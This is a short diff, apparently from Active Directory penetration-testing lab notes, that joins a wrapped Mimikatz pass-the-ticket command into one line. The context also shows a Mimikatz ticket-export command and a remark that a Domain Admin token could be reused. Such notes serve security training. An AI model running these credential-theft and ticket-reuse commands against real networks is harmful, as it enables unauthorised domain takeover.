@@ -250,7 +250,7 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 - The DA token could be reused:
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-
-60a10000-Administrator@krbtgt-
-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
+Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
 ```
+
+
